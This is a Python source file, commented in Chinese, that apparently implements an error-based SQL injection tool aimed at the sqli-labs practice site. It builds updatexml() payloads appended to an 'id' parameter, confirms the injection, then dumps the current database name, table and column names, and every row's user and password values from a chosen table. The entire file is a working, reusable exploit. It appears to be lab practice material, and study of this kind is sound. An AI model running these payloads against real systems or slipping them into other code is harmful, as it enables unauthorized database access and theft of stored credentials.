'''
    报错注入

'''

import requests
import sys
import re
import test_bihe
'''
    定义
'''

class E(object):
    def __init__(self,URL):
        '''
            url : 攻击方URL 如：http://114.55.107.51:8080/sqli-labs/Less-1/
            cMode ：闭合方式
        '''
        self.url = URL
        self.cmode = self.cmode = test_bihe.bihefangshi(self.url)
        
    #得到请求头
    def getFlag(self,fUrl):
        res = requests.get(fUrl)
        return res.text

        
    #测试是否存在报错注入
    def isErrorSQLI(self):
        testPayload = self.url+"?id=1"+self.cmode+"+and+updatexml(1,concat('^',version(),'^'),1)--+"
        if "error" in self.getFlag(testPayload):
            return "yes"
        return "error"

    def getResult(self, key):
        testPayload = self.url + "?id=1" + self.cmode + "+and+updatexml(1,concat('%',(" + key + "),'%'),1)--+"
        # print(testPayload)
        text = self.getFlag(testPayload)
        res = re.findall("%.*?%", text)
        result = res[0]
        tLen = len(result)
        # print(result[1:tLen-1])
        return result[1:tLen - 1]

    # 得到当前数据库名
    def getCurrentDbName(self):
        key = "database()"
        tableName = self.getResult(key)
        return tableName

        # 得到数据库表名

    def getTableName(self, key):
        # ?id=1' and updatexml(1,concat('%',(select table_name from information_schema.tables where table_schema=database() limit 1,1),'%'),1)--+
        key = "select group_concat(table_name separator ';') from information_schema.tables where table_schema='" + key + "'"
        tableName = self.getResult(key)
        return tableName

    # 获取表中字段名
    def getColumnName(self, key):
        key = "select group_concat(column_name separator ';') from information_schema.columns where table_schema=database() and table_name='" + key + "'"
        columnName = self.getResult(key)
        return columnName

    # 获取用户信息
    def getUserInfo(self, key1, key2, key3):
        res = ""
        key = "select count(*) from " + key3 + ""
        info = self.getResult(key)
        num = int('%s' % info)
        for i in range(num):
            str1 = '%d' % i
            key_u = "select " + key1 + " from " + key3 + " limit " + str1 + ",1"
            userInfo = self.getResult(key_u)
            res += userInfo
            key_p = "select " + key2 + " from " + key3 + " limit " + str1 + ",1"
            userInfo = self.getResult(key_p)
            res = res + ":" + userInfo + ";"
        return res


